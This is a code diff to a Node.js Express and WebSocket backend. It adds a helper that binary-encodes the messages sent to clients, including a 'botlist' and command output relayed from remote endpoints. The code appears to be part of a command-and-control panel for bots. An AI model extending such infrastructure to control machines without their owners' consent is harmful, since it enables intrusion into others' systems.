@@ -11,6 +11,7 @@ var jsonParser = bodyParser.json()
 var urlencodedParser = bodyParser.urlencoded({ extended: false })
 const path = require('path');
 const cors = require('cors');
+const {parseBinary} = require('./helpers/parseBinary');
 
 function startBackend(){
     const app = express();
@@ -42,7 +43,8 @@ function startBackend(){
                             
                             var client = db.getColl(collections[0]);
                             db.getDocuments(client, {}).then( (doc, err) => {
-                                ws.send("botlist: " + JSON.stringify(doc))
+                                const binaryRes = parseBinary("botlist: " + JSON.stringify(doc));
+                                ws.send(binaryRes)
                             });
                         }
 
@@ -65,9 +67,11 @@ function startBackend(){
     });
     app.post('/outputback', jsonParser, (req, res)=>{//comando=req.body.cmd, output=req.body.output, endpoint=req.body.endp
         console.log(`rebut:\ncomando:${req.body.cmd}\n${req.body.output}endpoint:${req.body.endp}`);
-        wss.clients.forEach((client) => {
+        wss.clients.forEach( async (client) => {
             if (client.readyState === ws.OPEN) {
-              client.send(JSON.stringify({ endp : req.body.endp, command : req.body.cmd, output : req.body.output  }));
+                const strJson = await JSON.stringify({ endp : req.body.endp, command : req.body.cmd, output : req.body.output  });
+                const binaryJson = await parseBinary(strJson);
+                await client.send(binaryJson);
             }
           });
     });
